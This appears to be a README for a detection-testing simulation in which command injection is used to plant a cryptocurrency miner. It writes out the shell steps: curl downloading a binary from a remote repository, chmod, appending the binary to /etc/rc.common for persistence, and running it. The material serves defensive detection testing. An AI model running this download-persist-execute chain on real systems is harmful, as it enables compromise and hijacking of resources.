# Malware Simulation - Cryptocurrency Mining Attack

## Abstract

This educational security simulation demonstrates a **cryptocurrency mining malware attack** that exploits a command injection vulnerability in a web application. The attack follows a four-stage methodology that mirrors real-world malware deployment techniques:

1. **Payload Delivery**: Downloads a simulated cryptocurrency mining binary from a remote repository using command injection
2. **Privilege Escalation**: Sets execution permissions on the downloaded malware binary
3. **Persistence**: Establishes startup persistence by adding the malware to system initialization files
4. **Execution**: Launches the simulated mining operation with high CPU priority to maximize resource utilization

The simulation showcases how attackers can compromise web applications through command injection vulnerabilities, deploy persistent malware, and hijack system resources for cryptocurrency mining operations. This demonstration is designed to help security professionals understand attack methodologies and evaluate Datadog's Workload Protection capabilities in detecting and alerting on such threats.

**⚠️ Important**: This is a simulation using harmless demo binaries for educational purposes only.

## Attack Scenario Details

### Vulnerability Exploited
- **Command Injection**: Allows execution of arbitrary commands on the target server

### Attack Flow
1. **Initial Compromise**: Exploit command injection to download simulated malware
   ```bash
   curl -OL https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
   ```

2. **Privilege Escalation**: Make malware executable
   ```bash
   chmod +x malware.x64
   ```

3. **Persistence**: Add to startup configuration for survival across reboots
   ```bash
   bash -c 'echo /var/www/html/malware.x64 >> /etc/rc.common'
   ```

4. **Resource Hijacking**: Execute with high CPU priority for maximum mining performance
   ```bash
   /var/www/html/malware.x64 --cpu-priority 44
   ```

## Usage

1. Run the attack simulation: `kubectl exec -it deploy/playground-app -- /scenarios/malware/detonate.sh --wait`
2. Monitor detection in Datadog Workload Protection App

## Security Notice

This simulation uses **harmless demo binaries** and should only be run in isolated, educational environments. All malware components are fake and designed for demonstration purposes only.
